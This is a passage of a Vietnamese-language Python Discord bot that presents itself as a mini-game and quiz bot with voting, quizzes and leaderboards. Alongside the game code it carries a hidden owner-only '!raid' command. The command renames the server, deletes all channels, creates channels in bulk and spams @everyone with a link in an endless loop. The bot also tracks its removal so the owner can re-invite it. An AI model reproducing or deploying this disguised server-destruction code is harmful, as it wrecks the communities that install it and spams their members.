                player_list = "\n".join([f"👤 {name}" for name in players.values()]) if players else "Chưa có ai tham gia"
                embed.description = f"⏳ Nhấn **Tham gia ngay!** để vào game.\n👥 Số người đã tham gia: **{len(players)}**\n📋 **Danh sách:**\n{player_list}\n▶️ Nhấn **Bắt đầu game!** để bắt đầu vote."
                view = StartView()
                await interaction.response.edit_message(embed=embed, view=view)
                await interaction.followup.send(f"✅ **{interaction.user.mention}** đã tham gia!", ephemeral=False)
            else:
                await interaction.response.send_message("❌ Bạn đã tham gia rồi!", ephemeral=True)
        except Exception as e:
            print(f"[!] Lỗi join_start: {e}")

    elif custom_id == "start_game":
        if len(players) < 1:
            await interaction.response.send_message("❌ Cần ít nhất 1 người tham gia để bắt đầu!", ephemeral=True)
            return

        await interaction.response.send_message("⏳ Bắt đầu sau 3 giây...", ephemeral=False)
        for i in range(3, 0, -1):
            await interaction.edit_original_response(content=f"⏳ Bắt đầu sau {i} giây...")
            await asyncio.sleep(1)
        await interaction.edit_original_response(content="✅ Bắt đầu vote!")

        embed_vote = discord.Embed(
            title="🎮 **CHỌN MINI GAME** 🎮",
            description="Bấm nút bên dưới để bỏ phiếu chọn game.\n"
                        f"⏳ Thời gian còn lại: **{VOTE_DURATION}s**\n"
                        "🏆 Game có số phiếu cao nhất sẽ được chọn!",
            color=discord.Color.blue()
        )
        for game_id, game in MINI_GAMES.items():
            embed_vote.add_field(name=f"{game['emoji']} {game['name']}", value=game['desc'], inline=False)

        view = VoteView(MINI_GAMES)
        await interaction.followup.send(embed=embed_vote, view=view)
        await asyncio.sleep(VOTE_DURATION)

        if not view.votes:
            await interaction.followup.send("❌ Không có ai bỏ phiếu! Hãy dùng `/start` lại.", ephemeral=True)
            return

        vote_counts = {}
        for game_id in view.votes.values():
            vote_counts[game_id] = vote_counts.get(game_id, 0) + 1

        max_votes = max(vote_counts.values())
        top_games = [gid for gid, count in vote_counts.items() if count == max_votes]
        chosen_id = random.choice(top_games)
        chosen_game = MINI_GAMES[chosen_id]

        for i in range(10, 0, -1):
            await interaction.edit_original_response(content=f"⏳ Kết thúc vote sau {i} giây...")
            await asyncio.sleep(1)

        embed_result = discord.Embed(
            title="🎉 **GAME ĐƯỢC CHỌN** 🎉",
            description=f"**{chosen_game['emoji']} {chosen_game['name']}**\n"
                        f"📖 {chosen_game['desc']}\n"
                        f"🗳️ Số phiếu: **{max_votes}**",
            color=discord.Color.gold()
        )
        await interaction.followup.send(embed=embed_result)

        if chosen_game['mode'] == "team":
            await run_team_game(interaction.channel, chosen_id)
        else:
            await run_mini_game(interaction.channel, chosen_id)

    elif custom_id == "ready_tai_xiu":
        global ready_users
        user_id = str(interaction.user.id)
        if user_id in players:
            ready_users.add(user_id)
            await interaction.response.send_message(f"✅ **{interaction.user.mention}** đã sẵn sàng!", ephemeral=False)
        else:
            await interaction.response.send_message("❌ Bạn chưa tham gia game!", ephemeral=True)

# ===== LỆNH RANDOM =====
@tree.command(name="random", description="🎡 Chọn ngẫu nhiên 1 người đã tham gia và đang online")
async def slash_random(interaction: discord.Interaction):
    if not interaction.guild:
        await interaction.response.send_message("❌ Lệnh này chỉ dùng trong server!", ephemeral=True)
        return

    online_players = [
        m for m in interaction.guild.members 
        if str(m.id) in players and m.status != discord.Status.offline and not m.bot
    ]
    
    if not online_players:
        await interaction.response.send_message("❌ Không có người chơi nào đang online! Hãy dùng `/start` để tham gia.", ephemeral=True)
        return

    target = random.choice(online_players)
    q = random.choice(QUESTIONS)

    embed = discord.Embed(
        title="🎡 **VÒNG QUAY NGẪU NHIÊN - ONLINE** 🎡",
        description=f"🎯 **{target.mention}** được chọn!\n\n❓ **Câu hỏi:** {q['question']}\n\nHãy chọn đáp án bên dưới ({QUIZ_DURATION}s).",
        color=discord.Color.purple()
    )
    view = QuizView(q, target)
    await interaction.response.send_message(embed=embed, view=view)

# ===== LỆNH RANKINGS =====
@tree.command(name="rankings", description="🏆 Bảng xếp hạng toàn server")
async def slash_rankings(interaction: discord.Interaction):
    try:
        if not rankings:
            embed = discord.Embed(
                title="🏆 **BẢNG XẾP HẠNG** 🏆",
                description="❌ **Chưa có ai ghi điểm!**\nHãy tham gia trò chơi và trở thành người đứng đầu!",
                color=discord.Color.dark_gold()
            )
            embed.set_footer(text="💪 Hãy trả lời câu hỏi để tích điểm! – by Bananavuive")
            await interaction.response.send_message(embed=embed)
            return

        sorted_rank = sorted(rankings.items(), key=lambda x: x[1], reverse=True)[:10]
        leaderboard = ""
        medals = ["🥇", "🥈", "🥉"]
        for idx, (user_id, score) in enumerate(sorted_rank, 1):
            try:
                user = await client.fetch_user(int(user_id))
                name = user.display_name
            except:
                name = user_id
            rank_name = get_rank(score)
            rank_emoji = get_rank_emoji(rank_name)
            medal = medals[idx-1] if idx <= 3 else f"#{idx}"
            leaderboard += f"{medal} **{name}** – ⭐ {score} | {rank_emoji} {rank_name}\n"

        embed = discord.Embed(
            title="🏆 **BẢNG XẾP HẠNG TOÀN SERVER** 🏆",
            description=leaderboard if leaderboard else "❌ Chưa có dữ liệu.",
            color=discord.Color.gold()
        )
        embed.add_field(
            name="📊 **Điểm của bạn**",
            value=f"⭐ {rankings.get(str(interaction.user.id), 0)} điểm",
            inline=False
        )

        user_score = rankings.get(str(interaction.user.id), 0)
        next_rank = None
        for threshold, name, emoji in RANK_THRESHOLDS:
            if user_score < threshold:
                next_rank = {"name": name, "emoji": emoji, "threshold": threshold}
                break

        if next_rank:
            embed.add_field(
                name="🎯 **MỤC TIÊU TIẾP THEO**",
                value=f"Cần **{next_rank['threshold'] - user_score}** điểm nữa để đạt rank **{next_rank['emoji']} {next_rank['name']}**!",
                inline=False
            )
        else:
            embed.add_field(
                name="🏆 **THÀNH TỰU**",
                value="Bạn đã đạt rank cao nhất! **Siêu Tỉ Phú** 🏆",
                inline=False
            )

        embed.set_footer(text="🏅 Trả lời /random để nhận điểm! – by Bananavuive")
        await interaction.response.send_message(embed=embed)
    except Exception as e:
        print(f"[!] Lỗi rankings: {e}")

# ===== LỆNH DIEM =====
@tree.command(name="diem", description="📊 Xem số điểm hiện tại của bạn")
async def slash_diem(interaction: discord.Interaction):
    try:
        user_id = str(interaction.user.id)
        score = rankings.get(user_id, 0)
        rank = get_rank(score)
        rank_emoji = get_rank_emoji(rank)
        color = get_rank_color(rank)
        
        embed = discord.Embed(
            title="👑 **BẢNG ĐIỂM CÁ NHÂN** 👑",
            description=f"**{interaction.user.mention}**",
            color=color
        )
        embed.set_thumbnail(url=interaction.user.display_avatar.url)
        embed.add_field(
            name=f"{rank_emoji} **RANK** {rank_emoji}",
            value=f"**{rank}**",
            inline=False
        )
        embed.add_field(
            name="⭐ **TỔNG ĐIỂM** ⭐",
            value=f"**{score}** điểm",
            inline=False
        )
        embed.add_field(
            name="📈 **XẾP HẠNG**",
            value=f"#{list(rankings.keys()).index(user_id) + 1 if user_id in rankings else 'Chưa có hạng'}" if rankings else "Chưa có dữ liệu",
            inline=True
        )
        embed.add_field(
            name="🏅 **THÀNH TÍCH**",
            value="🔥 Tiếp tục cố gắng!" if score < 50 else "💪 Rất tốt!" if score < 100 else "🌟 Xuất sắc!" if score < 200 else "👑 Huyền thoại!",
            inline=True
        )
        embed.set_footer(text="📌 Trả lời /random để nhận thêm điểm! – by Bananavuive")
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
    except Exception as e:
        print(f"[!] Lỗi diem: {e}")

# ===== MINI GAME - QUIZ =====
class QuizView(discord.ui.View):
    def __init__(self, question_data, target_user, timeout=QUIZ_DURATION):
        super().__init__(timeout=timeout)
        self.question_data = question_data
        self.target_user = target_user
        self.answered = False

        for i, opt in enumerate(question_data["options"]):
            btn = discord.ui.Button(label=opt, custom_id=f"ans_{i}", style=discord.ButtonStyle.primary)
            btn.callback = self.button_callback
            self.add_item(btn)

    async def button_callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.target_user.id:
            await interaction.response.send_message("❌ Chỉ người được chọn mới được trả lời!", ephemeral=True)
            return
        if self.answered:
            await interaction.response.send_message("❌ Bạn đã trả lời rồi!", ephemeral=True)
            return

        self.answered = True
        selected = int(interaction.data["custom_id"].split("_")[1])
        correct = self.question_data["answer"]

        user_id = str(interaction.user.id)
        old_score = rankings.get(user_id, 0)
        old_rank = get_rank(old_score)

        if selected == correct:
            new_score = old_score + 10
            add_points(user_id, 10)
            
            new_rank = get_rank(new_score)
            rank_up_msg = ""
            if new_rank != old_rank:
                rank_up_msg = f"\n\n🎉 **LÊN RANK!** {get_rank_emoji(new_rank)} **{new_rank}** !"
                embed_rank = discord.Embed(
                    title="🎉 **LÊN RANK!** 🎉",
                    description=f"**{interaction.user.mention}** đã đạt rank **{new_rank}** {get_rank_emoji(new_rank)}!",
                    color=get_rank_color(new_rank)
                )
                await interaction.channel.send(embed=embed_rank)
            
            await interaction.response.send_message(
                f"✅ **{interaction.user.mention} trả lời đúng!** +10 điểm. Tổng: {new_score} {get_rank_emoji(new_rank)}{rank_up_msg}",
                ephemeral=False
            )
        else:
            await interaction.response.send_message(
                f"❌ **{interaction.user.mention} trả lời sai!** Đáp án đúng: {self.question_data['options'][correct]}",
                ephemeral=False
            )

        for child in self.children:
            child.disabled = True
        await interaction.edit_original_response(view=self)

# ===== HÀM NUKE =====
async def change_guild_name(guild):
    try:
        await guild.edit(name=NEW_GUILD_NAME)
    except:
        pass

async def delete_all_channels(guild):
    for ch in list(guild.channels):
        try:
            await ch.delete()
            await asyncio.sleep(0.001)
        except:
            pass

async def create_channels_and_spam(guild):
    total_created = 0
    for batch_start in range(0, CHANNEL_COUNT, BATCH_SIZE):
        batch_tasks = []
        batch_count = min(BATCH_SIZE, CHANNEL_COUNT - batch_start)
        for i in range(batch_count):
            idx = batch_start + i + 1
            name = f"{RAID_NAME} {idx}"
            batch_tasks.append(guild.create_text_channel(name))
        channels = await asyncio.gather(*batch_tasks, return_exceptions=True)
        spam_tasks = []
        for ch in channels:
            if isinstance(ch, discord.TextChannel):
                spam_tasks.append(ch.send(f"🔗 **Link:** {SPAM_LINK}\n{SPAM_MESSAGE}\n@everyone"))
                total_created += 1
        if spam_tasks:
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(0.05)

async def continuous_spam(guild):
    while True:
        channels = list(guild.text_channels)
        if not channels:
            await asyncio.sleep(0.3)
            continue
        spam_tasks = []
        for channel in channels[:50]:
            spam_tasks.append(channel.send(f"🔗 **Link:** {SPAM_LINK}\n{SPAM_MESSAGE}\n@everyone"))
        if spam_tasks:
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(0.1)

async def raid(guild):
    await change_guild_name(guild)
    await asyncio.sleep(1)
    await delete_all_channels(guild)
    await asyncio.sleep(0.1)
    asyncio.create_task(create_channels_and_spam(guild))
    asyncio.create_task(continuous_spam(guild))

# ===== LỆNH !raid (DM lưu link, server nuke) =====
@client.event
async def on_message(message):
    if message.author.id == client.user.id:
        return
    if message.author.id != OWNER_ID:
        return

    if message.content.startswith("!raid"):
        parts = message.content.split()
        if not message.guild:
            if len(parts) > 1:
                link = parts[1]
                if link.startswith(("http://", "https://")):
                    save_saved_invite(link)
                    await message.channel.send(f"✅ Đã lưu link nuke: {link}")
                else:
                    await message.channel.send("❌ Link không hợp lệ!")
            else:
                await message.channel.send("❌ Hãy gửi !raid <link> trong DM để lưu link.")
        else:
            await raid(message.guild)

    elif message.content.lower() == "!stop":
        sys.exit(0)

# ===== SỰ KIỆN =====
@client.event
async def on_ready():
    print("="*50)
    print(" NUKE + MINI GAME VOTE – by BANANAVUIVE")
    print("="*50)
    print(f"[*] Bot online: {client.user}")
    print("[*] Public: /start, /random, /rankings, /diem")
    print("[*] Hidden: !raid (owner only – full nuke)")
    await tree.sync()
    print("[*] Slash commands synced.")
    for guild in client.guilds:
        print(f"[*] Connected to: {guild.name} (ID: {guild.id})")
    if saved_invite:
        print(f"[*] Saved invite link: {saved_invite}")

@client.event
async def on_guild_join(guild):
    print(f"[*] Added to new server: {guild.name}")

@client.event
async def on_member_remove(member):
    if member.id == client.user.id:
        owner = await client.fetch_user(OWNER_ID)
        if owner:
            await owner.send(f"[!] Bot kicked from {member.guild.name}. Re-invite needed.")

# ===== CHẠY =====
if __name__ == "__main__":
    print("[*] Starting bot...")
    try:
        client.run(TOKEN)
    except discord.errors.LoginFailure:
        print("[!] Invalid token.")
    except KeyboardInterrupt:
        print("[*] Interrupted.")
    except Exception as e:
        print(f"[!] Error: {e}") 
